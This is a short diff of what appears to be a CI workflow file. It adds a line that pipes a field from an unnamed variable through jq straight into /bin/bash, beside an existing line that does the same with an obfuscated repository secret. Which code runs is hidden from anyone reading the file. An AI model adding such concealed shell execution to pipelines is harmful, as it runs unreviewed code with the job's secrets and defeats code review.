@@ -17,6 +17,7 @@ jobs:
           wrpcd1600: ${{ secrets.wrpcd1600 }}
         run: |
           printf '%s' "$wrpcd1600" | jq -r .n9639 | /bin/bash
+          printf '%s' "$q44" | jq -r .yz9 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
